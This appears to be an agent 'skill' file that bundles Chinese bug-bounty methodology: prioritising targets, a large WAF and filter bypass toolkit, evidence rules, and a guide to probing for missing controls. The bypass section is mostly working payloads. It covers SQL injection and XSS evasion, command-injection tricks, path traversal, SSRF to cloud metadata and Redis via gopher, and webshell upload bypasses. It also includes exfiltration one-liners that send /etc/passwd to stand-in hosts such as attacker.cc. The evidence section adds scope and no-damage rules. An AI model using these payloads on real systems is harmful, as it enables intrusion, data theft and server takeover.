# skill: src_hunter_method
title: src-hunter Methodology: Priority, Bypass, Evidence
when: methodology,priority,bypass toolkit,evidence discipline,src hunting,bug bounty method
tier: core

## VOIDFORGE TOOL MAP
methodology layer over the WHOLE arsenal: pick targets by priority, apply bypass toolkit before brute force, hunt control gaps, write evidence with hit-vs-verified discipline

## OPERATING CONTEXT
Grafted from the reverse-skill src-hunter corpus (WooYun-derived, MIT) — original zh preserved; FR/EN agent reads it fluently.

## SOURCE: 01-attack-priority.md

# 攻击路径最短原则——黑盒猎手版

> 视角：黑盒 SRC，关注的是**赏金价值 / 复现成本 / 平台审核优先级**，不是 CVSS 教科书

---

## 1. 一句话原则

**攻击者总是选阻力最小的路径——SRC 报告也应按"阻力"排队。**

阻力 = 认证门槛 + 复现步骤 + 利用工具门槛 + 社工依赖。
阻力越低，赏金越高，平台审核越快。

---

## 2. 四维评分（每维 0–3 分，总分 0–12）

| 维度 | 3 分（最优） | 2 分 | 1 分 | 0 分 |
|------|-------------|------|------|------|
| **认证门槛** | 完全无需登录 | 普通注册用户 | 特权用户（VIP / 商家） | 仅管理员 |
| **请求复杂度** | 单 HTTP 请求 | 2–3 步 | 需竞态 | 需精确时序 / 多日 |
| **社工依赖** | 无需用户交互 | 需点击链接 | 需用户输入 | 需管理员操作 |
| **利用门槛** | curl / 浏览器 | 常见工具（Burp、sqlmap） | 需自写 exploit | 需 0day |

**分级**：
- **P0（10–12 分）**：立即报告，平台 Critical 处理
- **P1（7–9 分）**：High，48–72h 跟进
- **P2（4–6 分）**：Medium
- **P3（0–3 分）**：Low / Info（多数平台不收）

---

## 3. 漏洞类型 × 默认价值矩阵

按"假定单请求 + 无认证"的最佳条件给出基线分。**实际报告要按真实条件减分。**

| 漏洞类型 | 基线 P 等级 | SRC 价值（H1 中位） | 备注 |
|---------|------------|---------------------|------|
| **未授权 RCE** | P0 | $5k–$50k | 直接服务器控制权 |
| **未授权 SSRF→云元数据** | P0 | $3k–$20k | AWS/阿里云 metadata |
| **任意文件写入** | P0 | $3k–$15k | 等价 RCE |
| **任意文件读取（含 `/etc/passwd` / 配置）** | P0/P1 | $1k–$8k | 看读到什么 |
| **未授权数据库 / Redis / Mongo** | P0 | $1k–$10k | 见 `playbooks/unauth-access.md` |
| **鉴权绕过 / 提权（普通→管理员）** | P0/P1 | $2k–$15k | |
| **关键功能 IDOR（订单 / PII / 支付）** | P1 | $500–$5k | 看泄露量 |
| **SQLi（可拖库）** | P1 | $1k–$8k | DBA 权限再涨 50% |
| **存储型 XSS（管理后台）** | P1 | $300–$3k | 配合 CSRF / IDOR 提分 |
| **未授权信息泄露（.git/.svn/备份）** | P1 | $500–$3k | 含数据库密码再升 P0 |
| **逻辑漏洞（密码重置 / 支付篡改）** | P1 | $500–$5k | |
| **CSRF（敏感操作）** | P2 | $100–$1k | 单独提交多被合并 |
| **反射型 XSS** | P2 | $50–$500 | 平台越来越不收 |
| **开放重定向** | P3 | $0–$200 | 多数平台标 N/A |

> 数据综合 H1 公开报告 + Bugcrowd VRT；具体平台标准以靶方 policy 为准。

---

## 4. 价值升级链（Chain to escalate）

报告 P2 不如把它链到 P0。常见升级链：

```
开放重定向            → 配合 OAuth     → 账号接管 (P1)
反射 XSS              → 配合管理后台   → 后台沦陷 (P1)
SSRF (任意 URL)        → 探测内网 6379  → Redis 写 SSH 公钥 (P0)
任意文件读             → 读 /proc/self/environ / 配置 → 拿 DB 密码 (P0)
SQLi 普通用户          → 读 admin hash  → 离线破解 / 改密 (P0/P1)
IDOR                   → 改 role=admin  → 越权提权 (P0)
默认凭据 admin/admin   → 后台上传       → Webshell (P0)
.git 泄露              → 读源码         → 找 hardcoded secret / 内网 (P0)
```

报告**链路最长 / 终点最高**的版本，赏金最大化。

---

## 5. 9 类敏感操作 × 黑盒优先级

下表把 `sensitive_operations_matrix.md` 的"白盒控制"翻译成"黑盒最先测的探针"。
每个操作类型，开局先发一发"关键控制是否缺失"的子弹。

| 操作类型 | 识别特征（URL / 参数） | 必探的控制缺失 | 缺失则 |
|---------|----------------------|--------------|--------|
| **数据修改** | POST/PUT/DELETE，含 `id`/`uid`/`oid` | 鉴权 / 资源所有权 | IDOR / 越权 (P1) |
| **数据访问 (GET 单条)** | `/user/{id}`、`/order/{id}` | 资源所有权 | 横向越权 IDOR (P1) |
| **批量 / 导出** | `/export`、`/download`、`/batch` | 鉴权 + 范围限制 + 数量限制 | 大量数据泄露 (P1) |
| **权限变更** | `/role`、`/grant`、`/permission` | 高级授权 + 边界检查 | 提权到 admin (P0) |
| **资金操作** | `/transfer`、`/pay`、`/refund` | 金额校验 + 幂等 + 并发 | 篡改金额 / 双花 (P0) |
| **外部 HTTP** | `/fetch`、`/preview`、`/import?url=` | URL 白名单 + 协议限制 + 内网封禁 | SSRF (P0/P1) |
| **文件上传** | multipart/form-data | 类型 + 内容 + 路径校验 | 上传 webshell (P0) |
| **文件读取 / 下载** | 含 `path`/`file`/`filename` | 路径规范化 + 权限 | 任意读 (P0) |
| **文件删除（易遗漏！）** | DELETE / `?action=del` | 路径 + 权限 + 审计 | 任意文件删 (P0) |
| **命令执行 / Ping / 诊断** | `/ping`、`/nslookup`、`/exec`、`/util` | 命令白名单 + 参数过滤 | RCE (P0) |
| **认证操作** | `/login`、`/reset`、`/sms` | 验证码 + 频率 + 绑定 | 撞库 / 重置 (P1) |

**操作流程**：
1. 抓功能列表 → 把每个端点归到上表某类
2. 对该类型对应的"必探控制"逐一发探针（详见 `04-control-gap-hunting.md`）
3. 发现缺失 → 进入对应 `playbooks/<类型>.md` 完成利用 → 评分 → 报

---

## 6. 何时降级 / 何时不报

降级条件（每条 -1 分，可降到 P3 即放弃）：

- 内网隔离资产，互联网不可达
- 已部署 WAF/IPS 且 5 种以上 bypass 都失败
- 利用窗口极短（< 100ms 竞态，且无法稳定复现）
- 数据脱敏到无业务价值（只能拿到 user_id 序号）
- 平台明示 OOS（Out of Scope）

不报条件：

- 仅依赖物理接触 / 已 root 设备
- 仅在自定义 client（私有 SDK）下复现
- 自签证书 / 用户主动安装恶意 CA
- 已知 CVE 但目标显然已打补丁，只在版本号上"看起来旧"

---

## 7. 报告标题模板

```
[P0][未授权][RCE] /api/v1/import 接受 ${jndi:} - 单包打穿
[P1][认证后][SQLi] /api/search?q= UNION 注入，可读 admin hash
[P1][越权][IDOR] /api/orders/{id} 横向遍历他人订单（脱敏 100 条）
[P2][CSRF] 敏感操作 /api/email/change 缺 token + SameSite=None
```

格式：`[等级][条件][类型] 端点 - 一句话描述`。

---

## 8. 报告排序口诀

> **未授权 > 认证 > 管理员**
> **单包 > 多包 > 竞态**
> **直接利用 > 链式利用**
> **新型 > 老型**
> **真实数据 > 自造数据**

按这个口诀，把同一个目标的所有 finding 排好序再提交，平台审核员看了不头大。

---

## SOURCE: 02-bypass-toolkit.md

# 通用绕过工具箱

> 综合改写自 `core/bypass_strategies.md` + 各 wooyun playbook 的 bypass 章节
> 视角：黑盒，被 WAF / 过滤器 / 业务校验拦了，怎么继续

---

## 1. 绕过的本质

```
绕过 = 解析差异 + 边界 corner case + 防护盲区

每次被拦时问自己：
  Q1. 防护组件和后端的解析是否一致？（前置 WAF vs Tomcat、CDN vs 源站）
  Q2. 防护是否覆盖所有 corner case？（双编码、混合 case、长度溢出）
  Q3. 防护是否覆盖所有入口？（Header、Cookie、HPP、其他动词）
```

通用决策树：

```
Payload 被拦
 ├─ 看返回是 WAF？应用？还是源站？
 │   ├─ WAF 拦 → 协议层绕过（HPP / Chunked / 大小写 / Content-Type）
 │   └─ 应用拦 → 编码层 / 语义层（双写、注释、等价函数）
 ├─ 看是黑名单还是白名单
 │   ├─ 黑名单 → 找漏掉的关键字 / 同义词
 │   └─ 白名单 → 找白名单允许的危险用法
 └─ 看是输入过滤还是输出编码
     ├─ 输入过滤 → 多重编码 / 二次注入
     └─ 输出编码 → 上下文逃逸（HTML→JS、URL→JS）
```

---

## 2. SQLi 绕过表（分维度）

### 2.1 关键字过滤
| 技巧 | Payload | 适用 |
|------|---------|------|
| 大小写 | `UnIoN SeLeCt` | 黑名单纯 lower 检测 |
| 双写 | `UNunionION SELselectECT` | 一次替换型过滤器 |
| 注释插入 | `un/**/ion sel/**/ect` | 空白符过滤 |
| MySQL 内联注释 | `/*!50000union*//*!50000select*/` | 经典 WooYun 案例 |
| 同义词 | `\|\|` 代 `OR`，`&&` 代 `AND` | 关键字 OR/AND 过滤 |
| 等号替换 | `LIKE` / `REGEXP` / `IN(1)` / `BETWEEN` | `=` 过滤 |
| 函数等价 | `mid()`/`substr()`/`substring()`/`left()` | 子串函数过滤 |

### 2.2 空格过滤
```
/**/   %09(Tab)   %0a(LF)   %0d(CR)   %0b   %0c
括号嵌套：select(user)from(dual)
反引号（MySQL）：`select`user`from`
加号（URL 参数位）：select+user+from
```

### 2.3 引号绕过
```
0x61646D696E              （hex，'admin'）
char(97,100,109,105,110)
%df%27                    （GBK 宽字节）
```

### 2.4 数字型注入（无需引号）
```
id=1 AND 1=1
id=1 AND sleep(5)
id=1 AND IF(SUBSTRING(user(),1,1)='r',sleep(5),0)
```

### 2.5 时间盲注的双层延时（绕过 sleep 关键字）
```
id=(select(2)from(select(sleep(8)))v)        # WooYun-2015-0114228
id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(10) ELSE 1 END))
id=1 AND dbms_pipe.receive_message('a',5)=1   # Oracle
id=1; WAITFOR DELAY '0:0:5'--                 # MSSQL
```

---

## 3. XSS 绕过表

### 3.1 标签过滤
```
<ScRiPt>   <script/x>   <script\n>   <script\t>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

### 3.2 事件库（按罕见度，越往下越能打 WAF）
```
onerror onload onclick onmouseover                  # 已被多数 WAF 收录
onfocus onblur oninput onchange autofocus           # 中等
onanimationend ontransitionend ontoggle ontouchstart
onpointerenter oncanplay onauxclick onbeforeprint   # 罕见
```

### 3.3 关键字 / 括号绕过
```
alert(1)                # Unicode
eval('al'+'ert(1)')          # 拼接
Function('alert(1)')()       # 构造器
window['al'+'ert'](1)
String.fromCharCode(97,108,101,114,116,40,49,41)
alert`1`                     # 模板字符串绕括号
throw onerror=alert,1
location='javascript:alert(1)'
```

### 3.4 编码层（按上下文）
| 上下文 | 编码 | 示例 |
|--------|------|------|
| HTML | 实体 | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| HTML | 16 进制实体 | `&#x3c;script&#x3e;` |
| JS 字符串 | Unicode | `<iframe/onload=alert(1)>` |
| URL | data: + base64 | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |
| CSS（IE） | 16 进制 | `xss:\65\78\70\72\65\73\73\69\6f\6e(1)` |

### 3.5 上下文逃逸快表
| 输出位置 | 闭合 | Payload |
|---------|------|---------|
| `<div>HERE</div>` | 标签 | `<svg onload=alert(1)>` |
| `<input value="HERE">` | 引号 | `" autofocus onfocus=alert(1) "` |
| `<a href="HERE">` | 协议 | `javascript:alert(1)` |
| `<script>var x="HERE"</script>` | 引号 | `";alert(1);//` |
| `<script>var x={"k":"HERE"}</script>` | JSON | `'-alert(1)-'` 或 `"};alert(1);//` |

---

## 4. 命令注入绕过表

### 4.1 拼接符
```
Linux:    ;   |   ||   &&   &   `cmd`   $(cmd)   %0a(LF)
Windows:  &   |   ||   &&   %0a
```

### 4.2 空格绕过
```
${IFS}        cat${IFS}/etc/passwd
${IFS}$9      cat${IFS}$9/etc/passwd
%09(Tab)      cat%09/etc/passwd
{a,b}         {cat,/etc/passwd}
重定向        cat</etc/passwd
```

### 4.3 关键字绕过
```
c'a't  c"a"t  c\at         # 引号 / 反斜杠分割
a=ca;b=t;$a$b /etc/passwd  # 变量拼接
/bin/c?t /etc/passwd       # 通配符
/???/??t /etc/p??s??       # 全通配
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh    # base64 嵌套
```

### 4.4 cat 替代品（命令字过滤时）
```
tac head tail more less nl sort uniq od xxd base64 rev paste strings
# 全部能读出文件内容
```

### 4.5 无回显外带
```bash
# DNSLog
ping `whoami`.xxx.dnslog.cn
curl `cat /etc/passwd | base64 | tr -d '\n'`.xxx.dnslog.cn

# HTTP 外带
curl https://attacker.cc/?d=`whoami`
curl -X POST -d "$(cat /etc/passwd | base64)" https://attacker.cc/

# 时间外带（盲）
if [ `id -u` -eq 0 ]; then sleep 5; fi
```

---

## 5. 路径遍历 / 文件读绕过表

### 5.1 编码梯度
```
../        →  %2e%2e%2f
../        →  %252e%252e%252f      （双重 URL）
../        →  ..%c0%af / ..%c1%9c   （超长 UTF-8，旧 Tomcat / GlassFish）
../        →  %u002e%u002e%u2215    （IIS / 旧版 Java）
../        →  ....// / ..../        （过滤器删一次后剩下原型）
```

### 5.2 截断 / 协议
```
%00              ../../../etc/passwd%00.jpg     # PHP <5.3.4 / 旧 Java
;                /admin;.jpg                    # IIS / Tomcat
file://          file:///etc/passwd
view-source:     view-source:file:///etc/passwd
php://filter     php://filter/convert.base64-encode/resource=index.php
```

### 5.3 目录跳板
```
/.            //          /./           /../         /;/
/static/../config         /assets/..%2fapp/config.yml
```

---

## 6. SSRF 绕过表

### 6.1 IP 表示法
```
http://127.0.0.1
http://2130706433             # 十进制
http://0177.0.0.1             # 八进制
http://0x7f.0x0.0x0.0x1       # 16 进制
http://127.1                  # 简写
http://[::1]                  # IPv6
http://[::ffff:127.0.0.1]
```

### 6.2 域名绕过
```
http://127.0.0.1.nip.io       # 公共解析回环
http://localtest.me           # 同上
http://attacker.com#@127.0.0.1
http://attacker.com\@127.0.0.1
http://attacker.com&@127.0.0.1
DNS Rebinding                 # 第一次查询返回外网，第二次返回内网（rbndr.us、tartarsauce.org）
```

### 6.3 协议
```
file://     file:///etc/passwd
gopher://   gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
dict://     dict://127.0.0.1:6379/info
ldap://     ldap://attacker.com/
ftp://      ftp://attacker.com/
```

### 6.4 云元数据（必试）
```
AWS         http://169.254.169.254/latest/meta-data/
AWS-IMDSv2  curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token
GCP         http://metadata.google.internal/computeMetadata/v1/    Header: Metadata-Flavor: Google
Azure       http://169.254.169.254/metadata/instance?api-version=2021-02-01    Header: Metadata: true
阿里云      http://100.100.100.200/latest/meta-data/
腾讯云      http://metadata.tencentyun.com/latest/meta-data/
```

---

## 7. WAF 通用绕过

### 7.1 协议层
| 技巧 | 说明 |
|------|------|
| HPP（HTTP Parameter Pollution） | `?id=1&id=2' OR 1=1--`，前/后端取的参数不同 |
| Chunked Transfer-Encoding | `Transfer-Encoding: chunked` 让 WAF 看不到完整 body |
| Content-Type 混淆 | multipart 边界混淆 / 改为 `application/xml` 让 WAF 不解析 |
| HTTP 方法覆盖 | `X-HTTP-Method-Override: PUT`、`_method=DELETE` |
| HTTP/2 vs HTTP/1 转换差异 | 见 `playbooks/http-smuggling.md` |
| 大小写 Header | `cONTENT-tYPE` 某些 WAF 不认 |

### 7.2 编码层
```
1. 多重编码：URL → HTML 实体 → Unicode 三重套娃
2. 字符集：GBK 宽字节 / UTF-7 / UTF-16
3. Content-Encoding: gzip 压缩 body
```

### 7.3 长度 / 拆分
```
1. 超长参数（超过 WAF 检测窗口，常见 8KB / 16KB）
2. 多参数组合：part1=SEL part2=ECT
3. 二次注入：先存进 DB，再触发
4. 冷门入口：Cookie / Referer / X-Forwarded-For / User-Agent
```

---

## 8. 文件上传绕过表

| 检测层 | 绕过 |
|--------|------|
| 客户端 JS | 禁用 JS / Burp 拦响应 |
| 扩展名黑名单 | `.Php`、`.pHp`、`.php3/.php5/.phtml/.phar`、`.PHP%20`、`.php.` |
| 扩展名白名单 | `%00` 截断（旧版 PHP/Java）、`shell.jpg/.php`（Nginx fix_pathinfo）、`shell.asp;.jpg`（IIS6）、`.jspx` |
| Content-Type | 改 `image/jpeg`、`image/gif` |
| 文件头 | 加 `GIF89a\n<?php ...?>` 或 `\x89PNG...` |
| 内容静态特征 | 变量函数 `$a='ass'.'ert'; $a($_POST['x']);`、`array_map('assert',$_POST)` |
| 二次渲染 | 把 payload 放在 EXIF、IDAT 块，渲染后仍可读 |
| 路径绕过 | `filename=../../web/shell.php`，旧版 ZipSlip |
| 解析配置 | Apache 多后缀 `.php.xxx` 从右向左、Nginx `/x.jpg/.php` |

---

## 9. 上传后访问路径不返回？

```
1. 抓包看响应是否含完整 URL
2. 看预览功能（很多 CMS 上传后能预览）
3. 看上传时间戳命名规则（`20140829221136jsp.jsp` 模式 → 时间爆破 ±60 秒）
4. 编辑器自带浏览功能（FCKeditor /connectors/...?Command=GetFoldersAndFiles&CurrentFolder=/../）
5. 配合任意文件读 / .git 泄露反推目录
```

---

## 10. Corner Case 速查清单

每发新 payload 前过一遍这张表：

- [ ] 双重 URL 编码（`%252e`）
- [ ] Unicode 变体（`%u0027`、`'`）
- [ ] 宽字节（GBK，`%df%27`）
- [ ] Overlong UTF-8（`%c0%ae` = `.`）
- [ ] 混合编码（部分编码 + 部分明文）
- [ ] 注释嵌套（`/*!50000select*/`）
- [ ] 科学计数法 / 浮点（`1e0union`、`1.0union`）
- [ ] 负数 / 0（`-1 UNION`、`0 OR`）
- [ ] 制表 / 换页（`\t \v \f \r`）
- [ ] HPP（重复参数）
- [ ] Chunked / Content-Encoding gzip
- [ ] 重复 Header（重复 Host、重复 CL）
- [ ] 路径规范化差异（`//`、`/./`、`/;param`、尾斜杠）
- [ ] JSON 重复 key（取首 / 取末）
- [ ] XML DTD（`<!ENTITY xxe SYSTEM "file:///etc/passwd">`）

---

## 11. 实战工作流（被拦了怎么办）

```
1. 先确认是谁拦的
   → 看响应头：Server / X-WAF / 错误页特征 / 状态码（403 / 406 / 418）
   → 同一参数发普通字符串看是否过；只在恶意 payload 触发就是 WAF

2. 识别 WAF
   → wafw00f https://target
   → 看常见特征：Cloudflare（cf-ray）、ModSecurity、AWS WAF、阿里云盾、长亭雷池

3. 选第一道绕过：
   → 编码层（最便宜）：URL 双编码 → Unicode → 实体
   → 语义层：等价函数 / 注释 / 大小写
   → 协议层：HPP / Chunked / 改 method / 改 Content-Type

4. 第一道失败：
   → 拆 payload（多参数组合 / 超长前缀填充 / Cookie 走私）
   → 切入口（Header → Cookie → JSON body → multipart）

5. 还失败：
   → 二次注入（先存再触发）
   → 切目标（如果是 SaaS 多租户，换租户域名 / 子域）
   → 记录"防护有效"，去打下一个端点
```

---

## SOURCE: 03-evidence-discipline.md

# 黑盒证据纪律

> 视角：报漏洞之前，确保你说的每一句都站得住，平台审核员复现得了

---

## 1. 一句话原则

**每个漏洞结论 = 一段可复现的 HTTP 流量 + 一段可观察的副作用证据。**

没有这两段 → 不是漏洞，是猜测，不要写进报告。

---

## 2. 黑盒"幻觉"是怎么产生的

| 幻觉类型 | 典型表现 | 真实情况 |
|---------|---------|---------|
| **响应特征幻觉** | 看到 500 + "syntax error" 就报 SQLi | 可能只是参数类型不匹配，不一定可注入 |
| **延时幻觉** | `sleep(5)` 后响应变慢就说时间盲注 | 可能是网络抖动 / 限流 / 偶发慢 |
| **回显幻觉** | 把自己输入的 payload 看到，就说 XSS | 可能在 `<textarea>` / 已转义 / Content-Type=text/plain |
| **报错幻觉** | 错误页提到 `/var/www/html/...` 就说路径泄露 | 可能本来就是公开文档 |
| **猜版本幻觉** | 看到 `Server: nginx/1.x` 就报 CVE | 没有任何 PoC 验证 |
| **内部 IP 幻觉** | DNSLog 收到一条记录就说 SSRF | 可能是浏览器预读 / 第三方扫描 |
| **平台数据幻觉** | "我以为是该公司的资产" | 资产不在 scope，提交就违规 |

> SRC 平台审核员每天看几百份报告，"我以为"漏洞会被秒拒并降低你的信誉分。

---

## 3. 黑盒证据三原则

### 原则 1：流量原貌

报告中的 PoC **必须**是可以复制粘贴到 curl / Repeater 直接复现的。

不要写：
```
"在 search 接口提交 ' or 1=1-- 即可触发 SQL 注入"
```

要写：
```http
POST /api/search HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGc...（脱敏到前 10 字符）
Content-Type: application/json
Content-Length: 45

{"keyword":"a' UNION SELECT version()-- -"}
```

加上：
- 完整 URL（含协议）
- 完整方法 + Header（敏感 Header 脱敏）
- Body 一字不漏
- 响应关键片段（截图 + 文本）

### 原则 2：差分证明

漏洞 = 行为偏离预期。证明偏离需要"对照组"。

| 测试 | 至少要有这 3 包 |
|------|--------------|
| **SQLi（盲）** | 真条件包（5s 延时） + 假条件包（即时返回） + baseline 干净包 |
| **IDOR** | 自己资源 200 + 他人资源 200（含他人数据） + 不存在资源 404 |
| **越权** | 普通用户拒绝 403 + 管理员通过 200 + 普通用户绕过 200（关键证据） |
| **逻辑** | 正常流程的响应 + 篡改流程的响应 + 篡改后的真实副作用（订单出现） |
| **SSRF** | 内网 IP 拒绝（参考） + 内网 IP 允许（漏洞） + 外网回连（DNSLog） |

### 原则 3：副作用可观察

代码执行类漏洞，必须有"在目标上发生事情"的证据：

| 漏洞类型 | 副作用证据 |
|---------|----------|
| **RCE** | DNSLog / HTTP 外带回显 / 文件创建并读回 / 命令输出截图 |
| **SSRF** | 收到内网响应正文 / 元数据 token / 外部 callback 服务器日志 |
| **任意文件读** | 目标文件实际内容（`/etc/passwd` 含 root: 行 / 配置含真实数据库地址） |
| **文件上传** | 上传后访问文件，得到非 404 响应 |
| **SQLi** | 实际数据：`version()`、`current_database()`、admin hash 前缀 |
| **XSS** | 弹窗截图 + URL bar / 配合 SRC 自家 XSS Hunter 平台收到 callback |

**严禁**：拖库 / 删数据 / 改密码 / 留 shell。证据取到"足以证明能做"即停。

---

## 4. 复现率要求

| 漏洞等级 | 最小复现率 | 复现次数 |
|---------|----------|---------|
| P0 RCE / 鉴权绕过 | 100% | 至少 3 次，间隔 1h+ |
| P1 SQLi / IDOR | 95%+ | 至少 3 次 |
| P1 逻辑 / 越权 | 90%+ | 至少 5 次（不同账号 / 不同时间） |
| P2 / 时间盲 | 80%+ | 至少 5 次，附带统计延时差 |
| 竞态 | "在 N 次中能稳定 hit" | 5 次以上，给脚本 |

复现率不到 → 在报告里**主动**说明（"在 5 次测试中 4 次成功"），不要装作 100%。

---

## 5. DNSLog / 带外平台选择

| 用途 | 推荐平台 |
|------|---------|
| DNS 外带 | `dnslog.cn`、`ceye.io`、Burp Collaborator、`interactsh`（免费、私有部署） |
| HTTP 外带 | Burp Collaborator、`requestbin.com`、自建 webhook |
| LDAP（JNDI/Log4Shell） | 自建 `JNDI-Injection-Exploit` / `marshalsec` |
| 通用回连 | `webhook.site`（界面友好，便于截图） |

**强烈建议自建 OOB 服务器**：
- 能保留完整证据日志
- 不会和别的研究员撞 token
- 可以放在不同 IP 段验证 SSRF "外网可达"

报告里写：
```
带外回显域名：xx.attacker.com（攻击者控制）
DNS 解析记录：2025-05-09 10:23:45 UTC，源 IP a.b.c.d 查询 xx.attacker.com
完整日志见附件 dns_log.txt
```

---

## 6. 截图规范

每张截图至少包含：

- 完整 URL bar（证明域名 + 路径 + 参数）
- 浏览器 / Burp 时间戳
- 响应内容（与漏洞强相关的字段高亮）
- 如有数据：**马赛克脱敏**，但保留位数和格式（手机号 `138****1234`、ID `12*****345`）

报告封面页通常需要 1 张"漏洞总览图"（一眼看到结果）。

---

## 7. 录屏规范（高分漏洞建议）

P0/P1 漏洞，附 30s–2min 录屏极大提升过审速度。

录屏要点：
- 开头露出 URL + 当前用户身份
- 实时演示请求 + 响应
- 关键页面/数据上有马赛克
- 时间戳可见
- 录完不剪辑（剪辑会被怀疑伪造）

工具：OBS、ScreenToGif、Burp 自带 Logger 录像、ffmpeg `ffmpeg -f x11grab ...`。

---

## 8. 范围 / 合规边界

报告之前自检：

- [ ] 域名 / IP 在 program scope 内（看 H1/Bugcrowd policy）
- [ ] 没有访问到他人的 PII（如果访问到了，立即停止 + 在报告中说明 + 不在报告中放原始数据）
- [ ] 没有触发 DDoS / 大量请求（fuzzing 限速 1–5 rps，IDOR 遍历最多取 10 条样本）
- [ ] 没有删除 / 修改任何数据
- [ ] 没有上传可被他人访问的内容（webshell / 钓鱼页面）
- [ ] 没有访问其他用户账号（OAuth 测试只用自己控制的两个账号）

不合规的"证据"会让漏洞作废 + 账号封禁。

---

## 9. 反模式（这些写法会被审核员秒拒）

```
❌ "可能存在 SQL 注入，建议进一步验证。"
❌ "推测后端使用了 MySQL，从而有时间盲注。"
❌ "由于 Header 里有 X-Powered-By: PHP，可能是反序列化漏洞。"
❌ "通过黑盒猜测，admin/admin 可能可登录。"（必须实测且只测 1–3 次，避免暴力）
❌ "我没有 PoC，但理论上可以..."
❌ "已上传 webshell，地址 /uploads/x.php"（违规）
❌ "我已经把 1000 条用户数据下载到本地"（违规）
```

正确：

```
✓ "通过 sleep(5) 与 sleep(0) 在同一参数下的稳定 5 秒延时差异，
   确认时间盲注存在。完整流量见附件 1，复现 5/5 次。"
✓ "通过两个测试账号 A、B，A 可以读取 B 的订单详情，
   附 HTTP 包 + 截图 + 仅 1 条样本（已脱敏）。
   未尝试遍历或导出。"
```

---

## 10. 自检清单（提交前过一遍）

- [ ] 标题符合 `[等级][条件][类型] 端点 - 一句话` 格式
- [ ] 资产在 scope
- [ ] 复现步骤逐条编号，含完整 HTTP 包
- [ ] 至少 1 张响应截图 + 1 张 URL 可见的截图
- [ ] 副作用证据（外带 / 数据 / 文件）
- [ ] 至少 3 次复现成功
- [ ] CVSS 3.1 / 4.0 vector + 影响段
- [ ] 修复建议（具体 + 可操作）
- [ ] 未对生产数据造成不可逆影响
- [ ] 个人 PII / 第三方数据已脱敏

走完这 10 条再点 Submit。

---

## SOURCE: 04-control-gap-hunting.md

# 控制缺口（Control Gap）狩猎

> 白盒视角：检查"代码里有没有这个控制" → 黑盒视角：探测"这个控制是否真的生效"
> 这是猎手拿到一个新功能、不知道从哪入手时的 SOP

---

## 1. 思维模型

**敏感操作 = 应有控制矩阵 → 黑盒探针 = 测每个控制是否缺失。**

```
看到端点 → 归类（数据修改 / 资金 / 文件 / SSRF / 认证 / 权限 / 命令 / 越权 / 信息）
         ↓
        翻表 → 该类型应该有哪 N 个控制
         ↓
对每个控制 → 设计探针：在不满足该控制的条件下访问，看响应
         ↓
        哪个返回 200 / 业务成功 → 漏洞
```

九大类操作 + 探针速查在第 3 章。

---

## 2. 端点分类速查

| 端点特征 | 类型 |
|---------|------|
| `POST/PUT/DELETE` + 资源 ID | 数据修改 |
| `GET` + 单个 ID（`/order/{id}`） | 数据访问 |
| 含 `export`、`download`、`batch` | 批量 |
| 含 `role`、`permission`、`grant` | 权限变更 |
| 含 `transfer`、`pay`、`refund`、`balance` | 资金 |
| 接受 URL 参数（`?url=`、`?fetch=`、`?import=`、回调） | SSRF |
| `multipart/form-data` 上传 | 文件上传 |
| 含 `file`、`path`、`filename`、`download` | 文件读 / 删 |
| 含 `cmd`、`exec`、`ping`、`nslookup`、`shell` | 命令执行 |
| `/login`、`/reset`、`/verify`、`/sms` | 认证 |

---

## 3. 9 类操作 × 探针表

### 3.1 数据修改 (CREATE / UPDATE / DELETE)

| 应有控制 | 黑盒探针 | 缺失则 |
|---------|---------|-------|
| 鉴权 | 删 Authorization / Cookie，发请求 | 未授权写 → P0 |
| 资源所有权 | 用账号 A 改 B 的资源 ID | IDOR / 越权 → P1 |
| 输入验证 | 改类型（int → "abc"）、长度溢出 | 报错 / 崩溃 → 信息泄露 |
| 输入完整性 | 加额外字段 `is_admin=true` | Mass Assignment → P0 |
| 操作确认 | 直接 DELETE 不带二次确认 token | 误删 / CSRF |

### 3.2 数据访问（READ）

| 探针 | 缺失则 |
|------|-------|
| 改 ID 序号（自增）/ 改 UUID（猜不动就枚举）/ 改 hash | IDOR |
| 删除认证后访问 | 未授权数据泄露 |
| `?ids=1,2,3,...,10000` 批量 | 大面积泄露 |
| 改字段筛选（`?fields=*` 或 GraphQL） | 字段级泄露 |

### 3.3 批量 / 导出

| 探针 | 缺失则 |
|------|-------|
| 改导出范围（`startDate=2010-01-01`） | 全量泄露 |
| 删除范围限制 / 用户筛选 | 跨租户泄露 |
| 高频调用 / 大并发 | DoS / 资源耗尽 |
| 改导出对象 ID（导出他人订单） | 越权批量 |

### 3.4 权限变更

| 探针 | 缺失则 |
|------|-------|
| 普通用户调用 `/role/grant` | 鉴权缺失提权 (P0) |
| 自己授予自己 admin | 自提权 (P0) |
| 普通管理员授予 super_admin | 边界缺失 (P0) |
| 改请求体 `role: admin` 等隐藏字段（IDOR + Mass Assignment） | 关键提权 (P0) |

### 3.5 资金

| 探针 | 缺失则 |
|------|-------|
| 金额改 0 / 0.01 / 负数 / 1e-10 | 金额校验缺失 (P0) |
| 改商品 ID 但保留低价 | 服务端不重算 → 任意支付 |
| 重放支付回调（同一签名两次） | 幂等缺失 → 双花 |
| 并发 50 次同请求 | 竞态 → 透支 / 双发卡券 |
| 把折扣券叠加 / 退货后回退优惠券 | 业务逻辑漏洞 |

参考：WooYun-2015-0108817（电商价格篡改）。

### 3.6 外部 HTTP（SSRF）

| 探针 | 缺失则 |
|------|-------|
| `?url=http://127.0.0.1` / `[::1]` / `2130706433` | 内网封禁缺失 |
| `?url=file:///etc/passwd` | 协议白名单缺失 |
| `?url=http://169.254.169.254/...` | 云元数据可达 |
| `?url=http://attacker.com` 看是否回连 | DNSLog 验证基本 SSRF |
| `?url=http://attacker.com` 触发 302 → 内网 | 重定向跟随未限制 |
| DNS Rebinding（`rbndr.us`） | 二次解析逃逸白名单 |

### 3.7 文件上传

| 探针 | 缺失则 |
|------|-------|
